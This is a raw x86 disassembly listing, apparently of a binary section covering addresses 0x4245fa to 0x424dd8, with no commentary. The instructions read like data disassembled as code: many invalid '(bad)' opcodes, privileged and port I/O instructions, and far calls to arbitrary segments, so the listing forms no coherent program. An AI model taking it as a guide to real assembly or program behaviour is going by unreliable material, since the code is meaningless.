  4245fa:	adc    ch,BYTE PTR [edx+0x79]
  4245fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4245fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4245ff:	jp     0x424626
  424601:	sbb    DWORD PTR [edx+ebp*8-0x70d1fb8d],ebx
  424608:	hlt    
  424609:	imul   DWORD PTR [edx-0x6886700b]
  42460f:	(bad)  
  424611:	jno    0x424608
  424613:	aam    0xb2
  424615:	outs   dx,DWORD PTR ds:[esi]
  424616:	pop    eax
  424617:	or     BYTE PTR [edi],bl
  424619:	pushf  
  42461a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42461b:	jle    0x424675
  42461d:	jnp    0x424674
  42461f:	inc    ecx
  424620:	sbb    al,0x6f
  424622:	adc    eax,DWORD PTR [edx-0x75cc4750]
  424628:	and    BYTE PTR [esp+ebp*2-0x40e4a57f],cl
  42462f:	int    0xf9
  424631:	add    eax,0x3d40c67e
  424636:	and    al,0x48
  424638:	das    
  424639:	jge    0x424605
  42463b:	dec    edi
  42463c:	adc    eax,0x2582f90f
  424641:	and    ecx,DWORD PTR [eax-0x14]
  424644:	call   0x643a6db1
  424649:	adc    BYTE PTR [edx],al
  42464b:	daa    
  42464c:	cdq    
  42464d:	fwait
  42464e:	push   ebp
  42464f:	icebp  
  424650:	fidiv  DWORD PTR [ebp+0x25645b8c]
  424656:	add    bl,0x14
  424659:	xchg   ebx,eax
  42465a:	mov    edx,0xf92cf148
  42465f:	xor    dh,bl
  424661:	push   0x3c71d4f5
  424666:	inc    eax
  424667:	int    0xce
  424669:	or     al,0x6d
  42466b:	stos   DWORD PTR es:[edi],eax
  42466c:	shl    DWORD PTR [edx+edx*8-0x22],cl
  424670:	iret   
  424671:	in     eax,dx
  424672:	dec    esi
  424673:	std    
  424674:	sub    ecx,DWORD PTR [edx-0x64]
  424677:	idiv   DWORD PTR [ebp-0x29]
  42467a:	call   0x8991:0xed9a21f1
  424681:	(bad)  
  424682:	pushf  
  424683:	fist   WORD PTR [edi-0x13a44af3]
  424689:	mov    ecx,edx
  42468b:	pop    eax
  42468c:	or     eax,esi
  42468e:	jae    0x4246a3
  424690:	js     0x42463e
  424692:	mov    bl,BYTE PTR [ecx-0x72]
  424695:	push   ebx
  424696:	imul   esp,DWORD PTR [edi-0x6e],0x3e36defa
  42469d:	xchg   edx,ebp
  42469f:	cmp    eax,0x2657b15d
  4246a4:	in     eax,dx
  4246a5:	pop    edx
  4246a6:	fisubr DWORD PTR ds:0x7a800009
  4246ac:	iret   
  4246ad:	adc    al,0x7f
  4246af:	xchg   edx,eax
  4246b0:	and    dh,0x7e
  4246b3:	rcr    BYTE PTR [esp+eax*8],0x31
  4246b7:	jmp    0xdec9:0xfd1303bc
  4246be:	push   ds
  4246bf:	bt     DWORD PTR [edx+ebp*8+0x13b4889b],esp
  4246c7:	(bad)  
  4246c8:	sub    DWORD PTR [ebp-0x4e21af4e],ebx
  4246ce:	push   esi
  4246cf:	mov    esi,0xedaff433
  4246d4:	push   ebp
  4246d5:	xor    DWORD PTR [esi],esi
  4246d7:	call   0xadc012d0
  4246dc:	adc    eax,0x6cbe705b
  4246e1:	sbb    eax,0xa2df3dc8
  4246e6:	push   es
  4246e7:	push   ecx
  4246e8:	mov    bl,bh
  4246ea:	mov    dh,0x85
  4246ec:	mov    ebx,0x7686198f
  4246f1:	aaa    
  4246f2:	inc    ecx
  4246f3:	call   0x8fca:0x95fce824
  4246fa:	into   
  4246fb:	pop    ebx
  4246fc:	mov    dl,0xf7
  4246fe:	mov    esp,0x5e9ff19
  424703:	iret   
  424704:	sar    DWORD PTR [esi+0xe77aa3a],0x5d
  42470b:	xchg   edi,eax
  42470c:	cmp    DWORD PTR [edx-0x4d],edi
  42470f:	jecxz  0x424750
  424711:	fsub   QWORD PTR ds:0x9fed7789
  424717:	mov    bh,0x98
  424719:	gs add al,0xb4
  42471c:	mov    edx,0x83ad3d8b
  424721:	fs mov edx,0x3927ca01
  424727:	jae    0x4246d0
  424729:	dec    edi
  42472a:	out    dx,eax
  42472b:	mov    ds:0xbd7b540a,al
  424730:	outs   dx,DWORD PTR ds:[esi]
  424731:	push   ss
  424732:	out    dx,al
  424733:	and    bl,al
  424735:	test   DWORD PTR [ebp-0x10],edi
  424738:	mov    BYTE PTR [edi+0x57],al
  42473b:	lods   al,BYTE PTR ds:[esi]
  42473c:	repz shr edx,1
  42473f:	and    al,bh
  424741:	cmp    BYTE PTR ds:[ecx-0x2e],al
  424745:	pop    edi
  424746:	shr    DWORD PTR [edi-0x7fbaadd],cl
  42474c:	dec    ecx
  42474d:	mov    esi,0xe8ac2e67
  424752:	or     eax,0x660b2665
  424757:	jmp    0x42475f
  424759:	ror    DWORD PTR [esi+0x4c],1
  42475c:	stos   BYTE PTR es:[edi],al
  42475d:	ins    DWORD PTR es:[edi],dx
  42475e:	xor    edi,edx
  424760:	arpl   bp,si
  424762:	xchg   ecx,eax
  424763:	out    0xdb,eax
  424765:	push   edi
  424766:	pop    es
  424767:	xlat   BYTE PTR ds:[ebx]
  424768:	push   0xbf8fd8e7
  42476d:	call   0x272a:0x595c936f
  424774:	mov    ds,WORD PTR [ecx-0x66]
  424777:	or     ecx,DWORD PTR [eax]
  424779:	pop    ss
  42477a:	push   0x8d52b67a
  42477f:	cli    
  424780:	inc    edx
  424781:	lods   eax,DWORD PTR ds:[esi]
  424782:	loope  0x424790
  424784:	ins    DWORD PTR es:[edi],dx
  424785:	fdiv   st(0),st
  424787:	cs pop edi
  424789:	test   ah,ch
  42478b:	dec    ebp
  42478c:	mov    cs,WORD PTR [esi+ebp*1+0x3c]
  424790:	nop
  424791:	cdq    
  424792:	jecxz  0x4247a0
  424794:	mov    edi,0x5355017b
  424799:	mov    esp,0xe38774a
  42479e:	pop    esp
  42479f:	pop    esp
  4247a0:	push   ebx
  4247a1:	jge    0x4247af
  4247a3:	leave  
  4247a4:	add    esi,ebp
  4247a6:	xlat   BYTE PTR ds:[bx]
  4247a8:	jge    0x4247d0
  4247aa:	dec    edi
  4247ab:	hlt    
  4247ac:	les    edi,FWORD PTR [ecx]
  4247ae:	xor    esi,edx
  4247b0:	cmp    bh,BYTE PTR [edi+esi*8+0x357fdacd]
  4247b7:	shl    ebp,0xaf
  4247ba:	rol    eax,0xd9
  4247bd:	fst    QWORD PTR [ebp-0x20179c2f]
  4247c3:	gs push es
  4247c5:	push   0x64bbb40c
  4247ca:	dec    esp
  4247cb:	pop    esi
  4247cc:	and    al,BYTE PTR [esi+0x5b]
  4247cf:	mov    ebx,0x231dea04
  4247d4:	push   0x5de90287
  4247d9:	or     eax,0x464399fe
  4247de:	cmc    
  4247df:	dec    eax
  4247e0:	mov    ecx,0x853b7afc
  4247e5:	lds    ebp,FWORD PTR [edx-0x71]
  4247e8:	scas   eax,DWORD PTR es:[edi]
  4247e9:	mov    dh,0xc
  4247eb:	adc    eax,0x16e5111f
  4247f0:	inc    ebx
  4247f1:	sub    DWORD PTR [edx-0x32018242],ebp
  4247f7:	jmp    0x42478a
  4247f9:	pop    ebp
  4247fa:	inc    edi
  4247fb:	inc    ebx
  4247fc:	scas   al,BYTE PTR es:[edi]
  4247fd:	fisub  DWORD PTR [edi]
  4247ff:	clc    
  424800:	or     al,0xa5
  424802:	cmp    dl,dh
  424804:	xchg   edx,eax
  424805:	stc    
  424806:	xor    DWORD PTR [ebx+0x7f62c61d],eax
  42480c:	jbe    0x4247db
  42480e:	aaa    
  42480f:	jne    0x42486e
  424811:	popa   
  424812:	outs   dx,BYTE PTR ds:[esi]
  424813:	jno    0x4247b8
  424815:	iret   
  424816:	dec    ebp
  424817:	sbb    esi,ebx
  424819:	push   ds
  42481a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42481b:	aaa    
  42481c:	shl    DWORD PTR [esi+0x3b],cl
  42481f:	scas   eax,DWORD PTR es:[edi]
  424820:	or     eax,0xf8ceddcd
  424825:	mov    ch,0x5f
  424827:	xchg   DWORD PTR [esi],ebx
  424829:	mov    ebp,ebx
  42482b:	rcl    DWORD PTR [ebp+0x444c49e6],0x9d
  424832:	inc    esp
  424833:	jnp    0x42485e
  424835:	jle    0x4247fd
  424837:	mov    ds:0x37e86556,eax
  42483c:	xchg   edx,eax
  42483d:	xlat   BYTE PTR ds:[ebx]
  42483e:	or     eax,0xf508f5f6
  424843:	aaa    
  424844:	(bad)  
  424845:	je     0x424870
  424847:	ret    
  424848:	pop    edi
  424849:	ror    BYTE PTR [esi+0x1f],0x84
  42484d:	(bad)  
  42484f:	inc    edx
  424850:	dec    edi
  424851:	pop    esp
  424852:	adc    eax,0xad0bfdad
  424857:	rep ins BYTE PTR es:[edi],dx
  424859:	jmp    0xd6f8:0x50ccd901
  424860:	xor    eax,0x2b6fb59
  424865:	lahf   
  424866:	pusha  
  424867:	mov    esp,0x6b57ff7f
  42486c:	add    ah,BYTE PTR [ebx+0x45]
  42486f:	mov    edi,0xdf46bd34
  424874:	out    0xa7,eax
  424876:	xchg   BYTE PTR [ecx-0x53d42825],bl
  42487c:	test   DWORD PTR [edi-0x2a],esp
  42487f:	ror    DWORD PTR [ebx-0x7c63fba0],0xce
  424886:	push   ebp
  424887:	enter  0x3ed3,0xff
  42488b:	sub    esi,ebp
  42488d:	sub    eax,0x8a57296a
  424892:	add    BYTE PTR [edx+0x456976dc],bh
  424898:	cmovle ebp,DWORD PTR [edi-0x5cc2e23e]
  42489f:	or     DWORD PTR [esi],esi
  4248a1:	or     dh,bl
  4248a3:	cmc    
  4248a4:	ss fwait
  4248a6:	out    0xf3,al
  4248a8:	imul   ebx,eax,0xffffffd0
  4248ab:	push   edx
  4248ac:	or     BYTE PTR [eax],al
  4248ae:	jne    0x4248dc
  4248b0:	jae    0x42483e
  4248b2:	jae    0x424875
  4248b4:	pop    ecx
  4248b5:	mov    ebx,0xdf37db51
  4248ba:	or     eax,0x23584c46
  4248bf:	pop    ss
  4248c0:	je     0x42486c
  4248c2:	cmp    al,0x1b
  4248c4:	jae    0x4248d1
  4248c6:	or     esp,esi
  4248c8:	stc    
  4248c9:	xor    eax,0x9e351836
  4248ce:	or     al,0xf9
  4248d0:	dec    ecx
  4248d1:	and    dl,BYTE PTR [edi+0x5dfd1b63]
  4248d7:	loopne 0x424951
  4248d9:	jns    0x424902
  4248db:	mov    ah,0x52
  4248de:	js     0x4248b4
  4248e0:	mov    edi,0x54265750
  4248e5:	push   0xffffffd7
  4248e7:	retf   0xafd3
  4248ea:	or     eax,ebx
  4248ec:	popa   
  4248ed:	imul   ebx
  4248ef:	into   
  4248f0:	aad    0x27
  4248f2:	ins    BYTE PTR es:[edi],dx
  4248f3:	push   ss
  4248f4:	mov    cl,0xaf
  4248f6:	sub    edi,eax
  4248f8:	jle    0x42494d
  4248fa:	push   eax
  4248fb:	or     edi,DWORD PTR [edx+eax*8-0x1]
  4248ff:	fidivr WORD PTR [edx+0x65]
  424902:	call   0x1afb:0xfc52f065
  424909:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42490a:	enter  0x43fc,0x60
  42490e:	pop    edx
  42490f:	aad    0xe7
  424911:	mov    ch,0x39
  424913:	lock lock and DWORD PTR [edx-0xe],ecx
  424918:	loope  0x424983
  42491a:	mov    ecx,0x17f0c4a4
  42491f:	sbb    eax,0x49e7069d
  424924:	add    esi,DWORD PTR [edx+0x2f2596b9]
  42492a:	inc    edi
  42492b:	pushf  
  42492c:	pop    ds
  42492d:	add    BYTE PTR [eax],al
  42492f:	add    BYTE PTR [eax],al
  424931:	add    BYTE PTR [ebx],dl
  424933:	lea    ebp,[ecx]
  424935:	imul   edi,DWORD PTR [edi+0x23fd53ef],0x6b
  42493c:	fcmovnb st,st(6)
  42493e:	bound  esi,QWORD PTR [eax-0x3df6a44d]
  424944:	add    DWORD PTR [eax],eax
  424946:	repz add al,0x0
  424949:	add    BYTE PTR [eax-0x1a],al
  42494c:	ret    0xf654
  42494f:	sub    eax,0xa41831df
  424954:	lds    ebx,FWORD PTR [ecx+0x100d6ecc]
  42495a:	mov    ch,0x55
  42495c:	add    esi,DWORD PTR [esi-0x8d860fa]
  424962:	retf   0xd170
  424965:	cmp    BYTE PTR [eax-0x57],cl
  424968:	out    0x6e,al
  42496a:	je     0x424980
  42496c:	sbb    dh,BYTE PTR [edx+edi*4-0x64cb3100]
  424973:	ins    BYTE PTR es:[edi],dx
  424974:	push   es
  424975:	and    al,0x90
  424977:	cvtpi2ps xmm3,QWORD PTR [edx]
  42497a:	xchg   esp,eax
  42497b:	xchg   edi,eax
  42497c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42497d:	test   eax,0xc881c68f
  424982:	lods   eax,DWORD PTR ds:[esi]
  424983:	call   0x460e:0x15b06331
  42498a:	or     DWORD PTR [ecx+0x75],esp
  42498d:	push   ecx
  42498e:	xchg   ebp,eax
  42498f:	or     edx,ebp
  424991:	mov    eax,0x29c7117a
  424996:	and    al,0x88
  424998:	jecxz  0x42498b
  42499a:	or     BYTE PTR [ecx*1+0x7b791389],cl
  4249a1:	mov    bh,0xf3
  4249a3:	and    edx,eax
  4249a5:	and    cl,BYTE PTR [esi]
  4249a7:	leave  
  4249a8:	into   
  4249a9:	cmp    eax,0xfe3fe48
  4249ae:	test   ecx,eax
  4249b0:	add    edi,eax
  4249b2:	cli    
  4249b3:	js     0x4249fa
  4249b5:	xor    cl,cl
  4249b7:	imul   edx,DWORD PTR [edx],0xfffffff5
  4249ba:	aaa    
  4249bb:	jmp    0xe3fe:0xfb996e0e
  4249c2:	push   ss
  4249c3:	(bad)  
  4249c4:	dec    ebp
  4249c5:	xchg   esp,eax
  4249c6:	inc    BYTE PTR [edx]
  4249c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4249c9:	cs loope 0x42498c
  4249cc:	cmp    dl,BYTE PTR [eax-0x5ae82c2]
  4249d2:	data16 gs fucomp st(1)
  4249d6:	enter  0xbbc1,0xf2
  4249da:	inc    ebp
  4249db:	lahf   
  4249dc:	cs mov ah,0xfc
  4249df:	xor    DWORD PTR [esi],ebx
  4249e1:	aad    0xfd
  4249e3:	fisubr DWORD PTR [eax-0x3dd07d0c]
  4249e9:	call   0x27db8709
  4249ee:	jmp    0xdd2f2baf
  4249f3:	mov    ds:0xf3778970,eax
  4249f8:	pop    eax
  4249f9:	adc    BYTE PTR [esp+ebp*1+0x1b],dh
  4249fd:	jb     0x4249a9
  4249ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424a00:	lds    ebp,FWORD PTR [bx-0xc48]
  424a05:	sbb    edx,DWORD PTR [edi-0x47]
  424a08:	popa   
  424a09:	(bad)  
  424a0a:	sti    
  424a0b:	cmp    al,0x56
  424a0d:	sahf   
  424a0e:	rcr    cl,0xc3
  424a11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424a12:	ins    BYTE PTR es:[edi],dx
  424a13:	sub    ebp,DWORD PTR [ecx-0x51]
  424a16:	xor    al,0x4a
  424a18:	mov    al,0x20
  424a1a:	fwait
  424a1b:	sub    DWORD PTR ds:0x3225e957,ebx
  424a21:	call   0xb9be:0x6ad17d17
  424a28:	sbb    ah,BYTE PTR [edi+0x3a]
  424a2b:	xlat   BYTE PTR ds:[ebx]
  424a2c:	scas   al,BYTE PTR es:[edi]
  424a2d:	or     ch,cl
  424a2f:	imul   DWORD PTR [ecx+0x37]
  424a32:	inc    edx
  424a33:	add    DWORD PTR [eax-0x2],ebx
  424a36:	outs   dx,BYTE PTR ds:[esi]
  424a37:	mov    ebx,0x7d54c6f0
  424a3c:	jae    0x4249d3
  424a3e:	sub    al,0x17
  424a40:	mov    ecx,0xf851163e
  424a45:	push   esp
  424a46:	jo     0x8510096c
  424a4c:	jge    0x4249d6
  424a4e:	or     al,BYTE PTR [ebx+edi*2+0x6f]
  424a52:	xor    DWORD PTR [edi+0x11],ebp
  424a55:	xchg   DWORD PTR [eax-0x31],edi
  424a58:	arpl   WORD PTR [ecx],di
  424a5a:	jmp    0x66f2:0xff7e7a23
  424a61:	push   es
  424a62:	sbb    eax,0xe2b20a0c
  424a67:	xchg   edi,eax
  424a68:	(bad)  [esi+0x5eaaaca2]
  424a6e:	(bad)  
  424a6f:	in     eax,dx
  424a70:	cmp    eax,0x8109714b
  424a75:	and    dh,BYTE PTR [eax-0x35]
  424a78:	pusha  
  424a79:	xchg   edi,eax
  424a7a:	in     al,dx
  424a7b:	sbb    ebx,DWORD PTR [eax+0x4a05bb70]
  424a81:	cmp    BYTE PTR [ebp+0x1d19ef96],cl
  424a87:	jns    0x424a73
  424a89:	out    0x4e,eax
  424a8b:	aam    0x25
  424a8d:	ins    DWORD PTR es:[edi],dx
  424a8e:	ret    
  424a8f:	test   BYTE PTR [edx-0x2a],bh
  424a92:	jbe    0x424af5
  424a94:	mov    cs,WORD PTR [eax-0x17]
  424a97:	lock push 0xe1168103
  424a9d:	mov    cl,0xa3
  424a9f:	mov    WORD PTR [edi+0x16],ss
  424aa2:	xor    ch,al
  424aa4:	sub    DWORD PTR [esi],0x3e0df93d
  424aaa:	std    
  424aab:	mov    ds:0xbcd2f263,eax
  424ab0:	aas    
  424ab1:	pop    esi
  424ab2:	(bad)  
  424ab3:	lock xchg ecx,eax
  424ab5:	xor    eax,DWORD PTR [edi+0x48]
  424ab8:	pop    esp
  424ab9:	push   esp
  424aba:	sbb    BYTE PTR [esi+0x45],dh
  424abd:	mov    eax,0x9dc488e9
  424ac2:	ja     0x424a68
  424ac4:	fisttp WORD PTR [ebx]
  424ac6:	lea    ebp,[esp+eiz*8+0x30bb4250]
  424acd:	mov    ebp,0x1be506b2
  424ad2:	xchg   ebx,eax
  424ad3:	pop    edi
  424ad4:	cmp    BYTE PTR [eax-0x70],bh
  424ad7:	add    esp,DWORD PTR [ecx-0x6001d636]
  424add:	std    
  424ade:	mov    ch,0x5c
  424ae0:	adc    edx,edi
  424ae2:	mov    DWORD PTR [eax+0x75191607],edi
  424ae8:	mov    eax,0x17153019
  424aed:	jmp    0x424a72
  424aef:	repz fisub DWORD PTR ds:0xc4f36448
  424af6:	(bad)  
  424af7:	aaa    
  424af8:	jg     0x424b1a
  424afa:	repz mov esi,0xc9c5e857
  424b00:	sbb    edi,DWORD PTR [ebx+0x3d]
  424b03:	fisubr WORD PTR [ecx-0x40]
  424b06:	ss std 
  424b08:	dec    edi
  424b09:	and    eax,0xedc3bce9
  424b0e:	push   0xffffffce
  424b10:	sti    
  424b11:	xchg   ebp,eax
  424b12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424b13:	inc    edi
  424b14:	pop    ebp
  424b15:	add    dl,BYTE PTR [edx]
  424b17:	or     esp,DWORD PTR [eax]
  424b19:	mov    BYTE PTR [esi+0x7],dl
  424b1c:	jl     0x424b5f
  424b1e:	and    DWORD PTR [ebx+0x52d63035],esp
  424b24:	xor    eax,DWORD PTR [edx]
  424b26:	mov    bh,0x86
  424b28:	push   ss
  424b29:	add    DWORD PTR [edx],0xffffff84
  424b2c:	retf   0xb67f
  424b2f:	popf   
  424b30:	and    bh,BYTE PTR [esi]
  424b32:	dec    ecx
  424b33:	mov    WORD PTR [eax-0x70efc625],cs
  424b39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424b3a:	(bad)
  424b3e:	mov    al,0x94
  424b40:	mov    ?,WORD PTR [esi+0x72]
  424b43:	shr    DWORD PTR [edi],cl
  424b45:	or     dh,BYTE PTR [edi]
  424b47:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424b49:	mov    ebx,0x910952b7
  424b4e:	(bad)  [eax-0x3e]
  424b51:	ror    BYTE PTR [ebp+eax*1+0x2d5125a8],cl
  424b58:	jge    0x424b87
  424b5a:	popa   
  424b5b:	lods   eax,DWORD PTR ds:[esi]
  424b5c:	out    dx,eax
  424b5d:	stos   DWORD PTR es:[edi],eax
  424b5e:	jae    0x424b8f
  424b60:	mov    DWORD PTR [eax+0x94dbb4],ecx
  424b66:	adc    ah,BYTE PTR [ebp+0x30]
  424b69:	mov    ebp,DWORD PTR [edi+0x2a]
  424b6c:	sti    
  424b6d:	dec    eax
  424b6e:	(bad)  
  424b6f:	in     al,0x8b
  424b71:	push   0x7f
  424b73:	mov    ds:0x3087583f,eax
  424b78:	xchg   esp,eax
  424b79:	mov    al,ds:0x737d8e7f
  424b7e:	test   BYTE PTR [esi],0xe5
  424b81:	loope  0x424b24
  424b83:	cmp    BYTE PTR [ebx+0x60f36867],al
  424b89:	sar    BYTE PTR [esp+esi*8-0x193d08b0],0x14
  424b91:	data16 fadd st,st(1)
  424b94:	cmp    eax,0x871f2d11
  424b99:	bound  esp,QWORD PTR [ebx]
  424b9b:	mov    bh,cl
  424b9d:	cmp    al,0xa0
  424b9f:	mov    DWORD PTR [ebp-0x49],ebp
  424ba2:	ret    
  424ba3:	fstp   DWORD PTR [esi-0x46]
  424ba6:	(bad)  
  424ba7:	xchg   ecx,eax
  424ba8:	pop    ebp
  424ba9:	fisttp WORD PTR [edi-0x17]
  424bac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424bad:	or     al,0x5
  424baf:	fisttp QWORD PTR [eax-0x3e]
  424bb2:	add    al,0x4f
  424bb4:	rol    DWORD PTR [esi-0x26],0x81
  424bb8:	aaa    
  424bb9:	enter  0xccdc,0x90
  424bbd:	test   BYTE PTR [esi],0xe9
  424bc0:	xor    esp,DWORD PTR [ecx-0x79]
  424bc3:	mov    cl,0x2c
  424bc5:	push   ss
  424bc6:	mov    eax,ds:0x93f08d85
  424bcb:	fwait
  424bcc:	(bad)  
  424bcd:	sub    edx,ebp
  424bcf:	mov    al,ds:0xa0a0cc6b
  424bd4:	stc    
  424bd5:	xchg   BYTE PTR [ebp+0x3d52e008],bl
  424bdb:	pop    es
  424bdc:	sub    DWORD PTR [edx+0x5a],ecx
  424bdf:	or     esi,DWORD PTR [esi+0x30]
  424be2:	(bad)  
  424be3:	fnstcw WORD PTR [esi-0x2c]
  424be6:	mov    esi,0xbe2d3e5c
  424beb:	outs   dx,DWORD PTR ds:[esi]
  424bec:	std    
  424bed:	push   eax
  424bee:	iret   
  424bef:	xor    al,0xe1
  424bf1:	xchg   ebx,eax
  424bf2:	jmp    0xe36e:0x45ba730b
  424bf9:	pop    ss
  424bfa:	icebp  
  424bfb:	int    0x36
  424bfd:	inc    edx
  424bfe:	fsub   QWORD PTR [edi-0x5b]
  424c01:	out    dx,eax
  424c02:	ja     0x424c7a
  424c04:	xor    eax,0xea2f0d85
  424c09:	sbb    ebp,edi
  424c0b:	pop    ds
  424c0c:	(bad)  
  424c0d:	xlat   BYTE PTR ds:[ebx]
  424c0e:	mov    eax,DWORD PTR [ecx+ecx*4-0x64]
  424c12:	stc    
  424c13:	bound  esi,QWORD PTR [ebx+0x3a93a313]
  424c19:	arpl   WORD PTR [ebx],si
  424c1b:	cmp    BYTE PTR [ebx+0x7585836e],dh
  424c21:	das    
  424c22:	clc    
  424c23:	dec    edx
  424c24:	mov    esp,edx
  424c26:	add    bh,dh
  424c28:	pushf  
  424c29:	push   ebx
  424c2a:	dec    edx
  424c2b:	retf   
  424c2c:	add    DWORD PTR [ebp-0x1a],0xacacc5b2
  424c33:	and    al,0x88
  424c35:	inc    esi
  424c36:	mov    dh,0xc2
  424c38:	mov    ebx,0x67caad9c
  424c3d:	scas   al,BYTE PTR es:[edi]
  424c3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424c3f:	clc    
  424c40:	xchg   ebx,eax
  424c41:	cli    
  424c42:	hlt    
  424c43:	sbb    edi,DWORD PTR [edi+edx*8-0x37]
  424c47:	imul   esp,DWORD PTR [eax],0xc03614c8
  424c4d:	in     al,dx
  424c4e:	push   eax
  424c4f:	out    0xa0,al
  424c51:	fisttp DWORD PTR [ecx-0x4]
  424c54:	mov    edx,0x21059e41
  424c59:	test   DWORD PTR [edx+0x4702b52e],0x6e86d511
  424c63:	xor    DWORD PTR [ebx+ecx*1-0x28],ebp
  424c67:	test   BYTE PTR [eax-0xd3af90f],ch
  424c6d:	jae    0x424cde
  424c6f:	mov    esp,0x438ecda9
  424c74:	xchg   ebx,eax
  424c75:	pusha  
  424c76:	mov    esp,0xd1593f2c
  424c7b:	(bad)  
  424c7c:	mov    ebx,0x76646ba8
  424c81:	fidiv  DWORD PTR [edi-0x2]
  424c84:	sbb    BYTE PTR [ecx+0x221befed],dh
  424c8a:	add    al,0xe3
  424c8c:	out    dx,eax
  424c8d:	ret    
  424c8e:	ror    BYTE PTR [ecx-0x8],1
  424c91:	xchg   edi,eax
  424c92:	xchg   esi,eax
  424c93:	ins    DWORD PTR es:[edi],dx
  424c94:	push   esp
  424c95:	xor    edx,DWORD PTR [ecx+eiz*1-0x40e38084]
  424c9c:	adc    ebp,DWORD PTR [edi-0x27]
  424c9f:	repnz rcr bh,cl
  424ca2:	das    
  424ca3:	dec    ecx
  424ca4:	cmp    BYTE PTR [ecx+0x642822b9],dh
  424caa:	outs   dx,DWORD PTR ds:[esi]
  424cab:	cld    
  424cac:	mov    eax,ds:0x21130c6b
  424cb1:	out    0x2a,al
  424cb3:	std    
  424cb4:	mov    al,0xd7
  424cb6:	sub    eax,0x76cb9456
  424cbb:	cmp    bh,BYTE PTR [ecx]
  424cbd:	ins    DWORD PTR es:[edi],dx
  424cbe:	pop    es
  424cbf:	jo     0x424d16
  424cc1:	jno    0x424cc4
  424cc3:	sti    
  424cc4:	ret    0xc7dd
  424cc7:	mov    edx,0xf9077a42
  424ccc:	lahf   
  424ccd:	pop    edx
  424cce:	jg     0x424c76
  424cd0:	icebp  
  424cd1:	repz jne 0x424c6c
  424cd4:	mov    ah,0x8d
  424cd6:	add    BYTE PTR [edx-0x4d1d3807],dh
  424cdc:	inc    ecx
  424cdd:	dec    eax
  424cde:	in     al,0x80
  424ce0:	sub    eax,0xf110bd52
  424ce5:	sub    al,0x61
  424ce7:	ins    BYTE PTR es:[edi],dx
  424ce8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424ce9:	leave  
  424cea:	das    
  424ceb:	xor    bl,BYTE PTR [ebx-0x57fb316b]
  424cf1:	mov    dl,0xcb
  424cf3:	push   0x70
  424cf5:	inc    eax
  424cf6:	std    
  424cf7:	jnp    0x424cdc
  424cf9:	mov    ds:0x8bb6467a,eax
  424cfe:	pop    edx
  424cff:	scas   al,BYTE PTR es:[edi]
  424d00:	adc    edi,ecx
  424d02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424d03:	call   0x6370:0x11652b6e
  424d0a:	adc    BYTE PTR ds:0x60b00d64,al
  424d10:	mov    DWORD PTR [eax+0x837ff86],ebp
  424d16:	mov    eax,ds:0x7dd4667a
  424d1b:	mov    bl,0xd1
  424d1d:	cmp    al,0x5e
  424d1f:	cmp    eax,0x10e3b806
  424d24:	pop    ebp
  424d25:	stos   BYTE PTR es:[edi],al
  424d26:	dec    esp
  424d27:	popf   
  424d28:	fs or  eax,0x1ea88e5b
  424d2e:	xor    al,cl
  424d30:	sahf   
  424d31:	inc    edx
  424d32:	pop    esi
  424d33:	sbb    eax,0x1f1f22b0
  424d38:	mov    ch,0x55
  424d3a:	push   es
  424d3b:	mov    cl,0xad
  424d3d:	pop    DWORD PTR [ebp-0x60]
  424d40:	loopne 0x424cc2
  424d42:	lods   al,BYTE PTR ds:[esi]
  424d43:	fcom   QWORD PTR [edx+0x1ec141f8]
  424d49:	push   edx
  424d4a:	mov    ch,0xc0
  424d4c:	sahf   
  424d4d:	mov    ebp,0x6ec59d35
  424d52:	mov    ecx,0x6cae651
  424d57:	dec    ebx
  424d58:	stos   DWORD PTR es:[edi],eax
  424d59:	adc    DWORD PTR [ecx+0x4e],esi
  424d5c:	mov    al,ds:0x5071863f
  424d61:	out    dx,eax
  424d62:	inc    edi
  424d63:	lods   eax,DWORD PTR ds:[esi]
  424d64:	xchg   edx,eax
  424d65:	or     bh,bl
  424d67:	pop    ecx
  424d68:	push   ds
  424d69:	adc    al,0x98
  424d6b:	mov    edi,0x9c46742f
  424d70:	fnsetpm(287 only) 
  424d72:	mov    edx,0x43a75c6f
  424d77:	test   BYTE PTR [edi-0x3de28d84],0xc3
  424d7e:	es nop
  424d80:	and    BYTE PTR [esi+0x2001d3f7],0x6f
  424d87:	mul    BYTE PTR ds:0x1a1c88a7
  424d8d:	fdiv   QWORD PTR [edi-0x5f1f39a5]
  424d93:	lahf   
  424d94:	or     ah,BYTE PTR ds:[edi]
  424d97:	sti    
  424d98:	daa    
  424d99:	into   
  424d9a:	push   ebx
  424d9b:	add    ebx,DWORD PTR [esi+0x43f5dad]
  424da1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424da2:	sub    ebx,eax
  424da4:	adc    BYTE PTR [edi-0x6668526b],ah
  424daa:	dec    edi
  424dab:	icebp  
  424dac:	push   cs
  424dad:	scas   al,BYTE PTR es:[edi]
  424dae:	sub    ebp,edx
  424db0:	sub    al,0x9f
  424db2:	add    dh,cl
  424db4:	cmc    
  424db5:	scas   eax,DWORD PTR es:[edi]
  424db6:	fwait
  424db7:	test   DWORD PTR [esi],eax
  424db9:	sub    eax,0x8d1879d7
  424dbe:	mov    ebp,0xcb0b6d1a
  424dc3:	in     al,dx
  424dc4:	sub    al,0xa9
  424dc6:	or     ah,BYTE PTR [ebx]
  424dc8:	jnp    0x424dc2
  424dca:	neg    ch
  424dcc:	imul   edi,DWORD PTR [ebx+edx*2-0x2ac5ba06],0xffffffc6
  424dd4:	mov    dl,BYTE PTR [edi]
  424dd6:	and    DWORD PTR [edx],edi
  424dd8:	sahf   
